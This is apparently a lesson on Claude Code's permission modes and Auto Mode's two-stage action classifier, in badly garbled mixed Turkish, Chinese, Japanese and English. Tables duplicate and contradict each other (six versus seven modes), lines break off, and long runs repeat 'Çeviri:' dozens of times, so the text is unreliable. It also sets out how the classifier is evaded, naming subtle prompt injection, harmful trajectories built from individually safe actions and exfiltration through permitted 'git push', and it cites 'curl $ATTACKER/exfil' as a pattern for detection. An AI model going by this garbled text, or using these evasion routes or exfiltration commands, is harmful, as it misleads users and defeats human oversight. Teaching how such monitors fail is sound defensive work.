# Claude Code Autonomous Agent olarak: İzin Modları ve Otomatik Modu
# Özerk Ajanlar için İzin Modu

> Bir izin merdivi  her eylemden onaylamaya kadar inceleme derecelerinin derecelendirilmesi  bir harmanın askeri olmayan bir ajandan ne yapabileceğini yönetmesidir. Claude Code, bu dersin çalışılmış örneği, altı modunu ortaya çıkarır: "plan" her eylemden önce soruyor, "devalt" (bir kullanıcı aracında "Elniştesi" olarak etiketlenmiş) sadece riskli olanları soruyor, "acceptEdits" otomatik olarak dosya yazısını onaylıyor ancak hala shell çalıştırmasını onaylıyor ve "bypassPermissions" her şeyi onaylıyor. Otomatik Mod  `auto`izin modu  eylem başına onayını, her eylemin yürütülmeden önce her eylemin gözden geçirileceği ve talebin talep ettiği ötesinde yükselen herhangi bir şeyi engelleyen ayrı bir sınıflandırıcı modeli ile değiştirir. Eylem bütçeleri,`max_turns`ve `max_budget_usd`. Kullanılabilirlik `auto`Plan, org etkinleştirme, model ve sağlayıcıya bağlıdır  ve Anthropic sınıflandırıcının tek başına yeterli olmadığını açıkça belirtir.

> **【中文解读】**Claude Code 暴露七个权限模式──"plan" 每动作前询问,"default" 仅对危险动作询问,"acceptEdits" 自动批准文件写入但仍确认 shell 执行,"bypassPermissions" 批准一切──Auto Mode(2026年3月24日)`max_turns`和 `max_budget_usd`实施──Auto Mode 作为研究预览发布Antropic 明确声明分类器单独不充分──

> **【拓展：权限阶梯 → 安全分级】**Claude Code'un yedi modülü temel olarak "özerklik merdiveni"dir:plan → default → acceptEdits → ... → bypassPermissions。 her model hız ve her hareketi incelemenin farklılıklarıdır.

>  **【前置】**学本节前 Lütfen önce bil:Fase 15·01(Uzun Uzak Uçaklı Ajanlar)  Anlamak Neden Uzun Uçaklı Ajan 权限系统  Anlamak için  Fase 14·27(Hızlı Enjeksiyon Savunması)  Anlamak Neden Ajan  Gördüğü İçerik Tamamen İnanamıyor  本节直接讲  Claude Code'ın gerçek hakları  Mode,                                                                                                                                                                                                            

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## Sorunlar. Sorunlar.

> **【中文解读】**Claude Code'un yetki modeli, Agent Güvenlik Kontrolünün tipik bir örneğidir.

> **【拓展：claude code permission modes】**Claude Code'un yetki tasarımı 2026 yılındaki kodlama ajanının güvenli en iyi uygulamalarını ortaya koydu.

Makine'nizdeki özerk kodlama ajanı ayrı bir güvenlik kategorisidir.

> Makine'deki otomatik kodlama ajanı özel bir güvenlik sınıfıdır.

Saldırı yüzeyi, ajanın  dosya sistemi, ağ, kimlik bilgileri, klipboyu, herhangi bir tarayıcı sekmesi, herhangi bir açık terminaline ulaşabileceği her şeydir. Bruce Schneier ve diğerleri bunu açıkça belirtti: bilgisayar kullanımı ajanları chatbotların "fonksiyon güncelleştirilmesi" değil, yeni bir risk profili olan yeni bir araç türüdür.

> 攻撃面はエージェントはあらゆるものを触れる―ファイルシステム、ネットワーク、証明書、剪贴板、任意のブラウザタグ、任意の開通端、Bruce Schneier ほか 公開標識: コンピュータを使用するエージェントは Chatting机器人の"機能更新"ではなく, onlar yeni tip risk arşivleri yeni tür araçlardır。

Claude Code'un izin sistemi Anthropic'in cevabı. Tek "özerk / özerk olmayan" anahtar yerine, bir yetenek merdivenini kapsayan altı mod vardır: plan → varsayılan → kabul Edits → ... → bypassPermissions. Her mod hız ve her eylem için inceleme arasındaki farklı bir değişimdir. Otomatik Mod (Mart 2026) onayı kullanıcının kritik yolundan uzaklaştıran ayrı bir sınıflandırıcı modeli ekler: çalışmadan önce her eylemini gözden geçirir ve istekten daha ileri giden her şeyi engeller.

> Claude Code'un yetki sistemi Anthropic'in cevabıdır. Bu bir "özerk/öntemsiz" açılış değil, ancak geçiş yetkinliği aşamasının yedi çeşit modeli: plan → varsayılan → kabul Edits → ... → bypassPermissions。 her model hız ve her hareket incelemesinin farklılıklarıdır. Oto Mode(2026 yılının 3 ayı) iki aşama bölge eklenecek, bölgeci, güvenli hareket onayını kullanıcının anahtar yollarını belirlemek için karar verecek, aynı zamanda bölgecilik işaretlerinin hareketlerini koruma inceleme aşamasını oluşturur.

>  **【类比】**Claude Code 权限模式 = 银行卡额度阶梯。(1) **plan**= 每笔交易都打电话问你;(2) **default**= Büyük miktarda işlem (s) yapılır (s)**acceptEdits**= 储蓄卡(消费自动,转账问);(4) **bypassPermissions (YOLO)**= kredi kartı sınırsız. Avtomatik Mod = 智能风控:99% 交易秒过,可疑交易(异地、大额、特殊商户)触发人工复核──

> ️ **【易错点】**Claude Code 权限的 3 个致命错误:(1) **本机用 bypassPermissions**Bir hızlı enjeksiyon 就能 rm -rf /; sadece on不敏感的临时容器用──(2) **没设 max_budget_usd**Bir uçuş döngüsü 1 saat 50 dolar yakıyor.`max_budget_usd=5`起步──(3) **完全信任 Auto Mode 分类器**Antropik 明确说"分类器单独不充分";高危操作(rm、转账、发邮件) iki kez onaylanması gerekir, hatta分类器说安全──


> **【中文解读】**Bu bölümde AI Ajanının temel kavramı ve gerçekleştirme yöntemleri ele alınıyor. Ajan, çevreyi gözlemleyebilen, kararlar verebilen, eylemleri gerçekleştiren ve hedefleri gerçekleştirene kadar döngülenebilen LLM tarafından yönlendirilmiş bir otonom sistemdir.

Mühendislik sorusu: Bu sistem neyi yakalar, neyi kaçırır ve belirli bir görev hangi modun gerçekte gerekliliğini sağlar?

> 工程問題: Bu sistem neyi yakalar, neyi bırakır, hangi modelle görevi gerçekte uygundur?

## Konsepten bir şey.

### Yedi izin modusu Yedi yetki modusu
### Altı izin modusu

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Yukarıdaki isimler Claude Code'nun kamu belgeleri ile uyumludur; UI etiketleri `default`"Elçici" olarak.)

> (上述名称匹配公开 Claude Code 文档;"yolo" 是宽松中间地带的非正式简写──)

### Otomatik Mod bir sayfada.

Otomatik Mod (24 Mart 2026 tarihinde başlatıldı) bir modele harekete geçerek onay vermenin ilk izin modudur.

> Otomatik Mod (Auto Mode) (published on March 24, 2026) ilk olarak modelin yetki modulu olarak tasarlanmıştır.

Yapı:

> 结构:

1. **Stage 1 — single-token classifier.**Önerilen her eylemde çalışır. Ucuz. "güvenli" veya "bayrak" gönderir. Ana ajan döngüsü ile paralel olarak çalışmak için tasarlanmıştır. Böylece onaylanmış eylemler bir kuyrukta oturmaz.
   Çeviri:**阶段 1——单 token 分类器。**Bu nedenle, bu işlemin onaylanması için, başlıca işlemin tamamlanması için tasarlanmıştır.
2. **Stage 2 — secondary policy/safety review.**Sadece işaretli eylemlerde çalışır. Eylem, oturumun mevcut durumu ve açıklanan görev üzerinde odaklı bir politika ve güvenlik değerlendirmesini yapar. Güven düşükse kullanıcı HITL'ye yükseltilir.
   Çeviri:**阶段 2——二级政策/安全审查。**仅在标记动作上运行――对动作、会话现状、声明任务执行聚焦政策和安全评估――置信度低时升级至用户HITL――
1. **A separate classifier model.**İndirilmeden önce önerilen her eylemin değerlendirilmesi, açıklanan göreve ve oturumun mevcut durumuna göre değerlendirilmesi ve istek talep edilenin ötesine çıkan her şeyi engelleme. Engellenmiş eylemler kullanıcıya geri döner.
2. **Gated availability.**- Ne ?`auto`planına, örgütleme yeteneğine, modeline ve tedarikciye bağlıdır.

Bütçe kontrolleri sınıflandırıcı ile bir arada yer almaktadır:

> Budget kontrol ve sınıflandırma

- `max_turns` bir oturumda toplam tekrarlamalar.
  Çeviri:`max_turns`会话总代数──
- `max_budget_usd`Seansı kesen dolarlık bir limit.
  Çeviri:`max_budget_usd`停止会话的美元上限──
- Bir araç başına işlem sayım sınırları (N  den fazla değil)`WebFetch`telefonlar vb.).
  Çinçe Çevirimi: Her araç hareket sayısı sınırlı(N 个                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             `WebFetch`调用等) ⋅

### Sistem neyi yakalar?

- Enjeksiyon verilen talimatların bilinen riskli bir eylem şekli ile haritası olduğu araç girişlerine doğru doğru enjeksiyon.
  Çinçe Çevirimi: direkt将提示注入工具输入,注入指示映射到已知危险动作形状──
- Tekrarlı araç döngüleri  sınıflandırıcı N+1 eylemini görebilir, neredeyse aynı eylem N'e, beş kez sırayla.
  Çinçe Çevirim:重复工具循环分类器可见动作 N+1 与动作 N 几乎相同,连续五次。
- Başka türlü dosya düzenleme seansında açıkça kapsam dışı komutlar.
  Çin Çeviri:                                                                                                                                                                                                                                                            

### Sistemin kaçırdığı şeyler

- **Subtle prompt injection**İndirim Cevap Enjeksiyonı tamamen patchable bir kırılganlık değildir (OpenAI hazırlık başlığı, 2025, tarayıcı ajanları  bak ders 11).
  Çeviri:**微妙提示注入**                                                                                                                                                                                                                                                              
- **Semantic-level misbehavior.**Her bireysel eylem, oluşturulan yörüngenin zararlı olduğu sürece güvenli görünebilir.
  Çeviri:**语义级不当行为。**Her tek hareket güvenli görünür ve birleştirilen yollar zararlıdır.
- **Exfiltration through legitimate channels.**Sonra da kendi dosyalarına veri yazmak.`git push`Bu, bir kamu repo'suna, sorunun oluşumu olan izin verilen eylemlerin bir dizi olduğunu gösterir.
  Çeviri:**通过合法渠道泄露。**- Bilgiyi sahip olduğun dosyalara yaz.`git push`Halk depolarına, hareketlerin izin verilmesi için bir dizi, bir araya gelmesi için bir sorun vardır.

### Araştırma ön görünüm çerçevesini

Anthropic, araştırma ön gösterisi olarak Otomatik Mod gönderdi. Belgeler açıkça sınıflandırıcının bir katman olduğunu, bir çözüm olmadığını göstermektedir: kullanıcıların Otomatik Mod'u bütçeler, izin listeleri, izole edilmiş çalışma alanları ve rota denetimi ile birleştirmeleri beklenmektedir (Deneyimler 1216). Önbellek çerçevesinde ayrıca belgelenmiş değerlendirme karşı dağıtım boşluğu (Dene 1)  offline değerlendirmeleri geçiren bir sınıflandırıcı, kullanıcı bağlamının belirsiz olduğu gerçek bir oturumda farklı davranılabilir.

> Antropic, Auto Mode'u araştırma önbellek olarak yayınladı. Arşiv açıklamaları için bir çözüm değil, bir katmanlı bir çözüm oluşturdu: Kullanıcıların Auto Mode'u bütçeye, listeye, ayrı çalışma alanına, trafik denetimine izin vermesi bekleniyor.

### Bu merdiven iş akışında yer alır.

- Bilinmeyen görev: Başlayın `plan`Planı okumak kötü bir koşuyu geri çevirmekten daha ucuz.
  Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri`plan`Orta başlıyor.
- Bilinen bir refactor: `acceptEdits`Çok fazla onay tıklamasını korur.
  Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri`acceptEdits`Çok fazla onaylama yapıldı.
- Kontrolsüz arka plan çalışması: `autoMode`Sadece patlama radyüsünü ölçtüğünüz bir çalışma alanında (itiraflar, üretim yüklemeleri, seçmediğiniz çıkışlar)
  Çin Çeviri: 无人值守后台运行: 仅在爆炸半径已测量工作区内`autoMode`(İşat belgesi yok, üretimi yok, ihracatı seçilmemiş)
- Efimeral kaplar: `yolo`- Ne ?`bypassPermissions`konteyner ve kimlik belgeleri bir kullanım için kullanılabilirse ve yalnızca kabul edilebilir.
  Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri`yolo`- Ne ?`bypassPermissions`Sadece bir konteyner ve onun belgesi kabul edilebilir ve atılabilir.
- Kontrolsüz arka plan çalışması: `auto`Sadece patlama radyüsünü ölçtüğünüz bir çalışma alanında (itiraflar, üretim yüklemeleri, seçmediğiniz çıkışlar)
- Efimeral kaplar: `dontAsk`- Ne ?`bypassPermissions`konteyner ve kimlik belgeleri bir kullanım için kullanılabilirse ve yalnızca kabul edilebilir.

```figure
autonomy-oversight
```

## Çerçeveyi kullanın.

`code/main.py`Bir eylem inceleme sınıflandırıcısı iki aşamalı bir boru hattı olarak simüle eder  bir öğretim basitleştirme; gerçek `auto`Mod, belgelenmiş iki aşamalı bir sözleşme değil, ayrı bir sınıflandırıcı modeli ile desteklenir. 1 aşamalı önerilen eylemler üzerinde ucuz bir anahtar kelime kuralıdır; 2 aşamalı daha yavaş bir çok kural değerlendirici. Sürücü kısa bir sentetik yoldayken (güvenli eylemler, bir hızlı enjeksiyon girişi, tekrarlayan bir döngü) besler ve sınıflandırıcı nerede yakaladığını ve nerede kaçırdığını gösterir.

> `code/main.py`模拟两阶段分类器──阶段 1 提议动作上的廉价关键词规则;阶段 2 较慢的多规则审查器──驱动器进入短合成轨迹(安全动作、提示注入尝试、重复循环) 并展示分类器的捕获和遗漏之处──

## İndirin . Ürünler .

`outputs/skill-permission-mode-picker.md`görev tanımını doğru izin moduna, bütçe sınırlarına ve gerekli izoleme göre eşleştirir.

> `outputs/skill-permission-mode-picker.md`Görevlerin tanımlanması doğru yetki sınırları modüne, bütçe sınırlarına ve ayrımcılığa uygun olacaktır.

## Egzersizler.

1. Çık .`code/main.py`Hangi sentetik eylem tipi asla 1. aşamada belirlenmez, ama her zaman 2. aşamada belirlenir?
   Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri`code/main.py`◊ Hangi türden yapay hareketler 1 aşamada belirtilmemiş fakat 2 aşamada tutulmuştur?

2. 1. aşama kuralını belirli bir bilinen kötü şekli yakalamak için uzatın (örneğin, `curl $ATTACKER/exfil`). İyi etki örneğinde yanlış pozitif oranı ölçülmelidir.
   Çinçe Çevirimi: genişleyiş aşaması 1 规则集以捕获特定已知坏形状 (örneğin)`curl $ATTACKER/exfil`)― 良性動作サンプルで測り 偽陽性率―

3. Anthropic'in "Agent Loop Nasıl Çalışır" belgesini okuyun.`default`- Çalışma modunda hangi kapıyı ayrı bir şekilde kapatmanız gerekiyor?`autoMode`- Gözaltı olmadan mı?
   Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Çeviri: Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Çeviri: Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç Ç`default`模式下 Agent 默认触及的每个外部状态――无人值守运行 `autoMode`Önceden neyi kontrol edeceksin?
3. Anthropic'in "Agent Loop Nasıl Çalışır" belgesini okuyun.`default`- Çalışma modunda hangi kapıyı ayrı bir şekilde kapatmanız gerekiyor?`auto`- Gözaltı olmadan mı?

4. 24 saatlik bir kontrolsüz çalışma bütçesini tasarlayın: `max_turns`- Evet .`max_budget_usd`Her numarayı haklı çıkar.
   Çin Çeviri: 24 saatlik çalışma bütçesi`max_turns`- Evet.`max_budget_usd`、 her araçın sınırları 、 izin listı 、论证每个数字──

5. Bir sonraki aşamada, her bir eylemin 1. ve 2. aşamada onaylandığı ve yine de oluşan davranışların yanlış uyum sağlanmadığı bir yoldur.
   Çinçe Çevirimiçi: Description of a track, each individual move is approved in phase 1 和阶段 2 批准, but the combined behavior is not in agreement.
5. Bir yolculuğu tarif eden tarafından onaylanan her bireysel eylemin, fakat oluşan davranışın yanlış uyumsuz olduğu bir yolculuğu anlatın.

## Anahtar Şartlar .

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Daha fazla okumak

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) İzin modları, bütçeler, eylem biçimi.
  Çinçe Çevirimi:权限模式、预算、动作格式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Yönetilen hizmet uygulanması modeli.
  Çeviri: "İdare hizmetleri"
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) Özellik yüzeyi ve Otomatik Mod duyuru.
  Çin Çeviri: funksiona面和 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) sınıflandırıcı yargılarını şekillendiren nedenlere dayalı katman.
  Çinçe Çevirisi: şekillendirilmiş sınıflandırma yargılamalarının düşünceye dayalı katmanları.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Uzun Uzak Uçraklık İzin Tasarımı İçsel Görüş.
  Çinçe Çevirimi:长程权限设计的内部视角──
